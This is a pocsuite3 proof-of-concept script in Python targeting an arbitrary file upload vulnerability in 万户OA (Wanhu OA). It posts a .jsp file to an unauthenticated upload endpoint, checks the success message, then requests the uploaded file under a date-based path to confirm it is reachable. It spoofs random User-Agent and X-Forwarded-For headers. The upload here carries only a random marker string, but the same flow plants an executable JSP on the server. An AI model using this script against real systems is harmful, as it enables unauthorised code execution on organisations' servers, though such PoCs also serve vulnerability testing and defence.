#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import contextlib
from poc_tool.tools import tools
import re
from datetime import datetime
from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger
)

minimum_version_required('2.0.5')


class DemoPOC(POCBase):
    vulID = '0'
    version = '1'
    author = ''
    vulDate = '2023-11-20'
    createDate = '2023-11-20'
    updateDate = '2023-11-20'
    references = []
    name = '万户OA任意文件上传'
    appPowerLink = ''
    appName = '万户OA'
    appVersion = '万户OA'
    vulType = 'Other'
    desc = 'Vulnerability description'
    samples = ['']
    install_requires = ['']
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': ''}
    suricata_request = ''
    suricata_response = ''

    def check(self, flag):
        res = self._exploit(flag)
        if res:
            headers = {
                'User-agent': tools.get_random_ua(),
                'X-Forwarded-For': tools.get_random_ip()
            }
            filename = re.findall('\d+\.jsp', res.text)
            current_date = datetime.now()
            formatted_date = current_date.strftime('%Y%m')
            response = requests.get(url=f"{self.url}/defaultroot/upload/dir/{formatted_date}/{filename[0]}", headers=headers, verify=False)
            logger.debug(f"\n\n{tools.get_req(response)}\n\n{tools.get_res(response)}")
            return response

    def _exploit(self, flag):
        headers = {
            'User-agent': tools.get_random_ua(),
            'X-Forwarded-For': tools.get_random_ip()
        }
        file = {
            'file': ('1.jsp', f'{flag}')
        }
        res = requests.post(
            url=f"{self.url}/defaultroot/platform/portal/layout/common/upload.jsp?portletSettingId=123&path=dir",
            headers=headers, files=file, verify=False)
        logger.debug(f"\n\n{tools.get_req(res)}\n\n{tools.get_res(res)}")
        if '上传成功' in res.text and 'parent.afterUpload' in res.text and res.status_code == 200:
            return res

    def _verify(self):
        with contextlib.suppress(Exception):
            result = {}
            flag = tools.get_random_str(20)
            res = self.check(flag)
            if flag in res.text and res.status_code == 200:
                result['VerifyInfo'] = {
                    '[ Success ] 万户OA_任意文件上传 ': self.url
                }
            return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def _shell(self):
        return self._verify()


register_poc(DemoPOC)
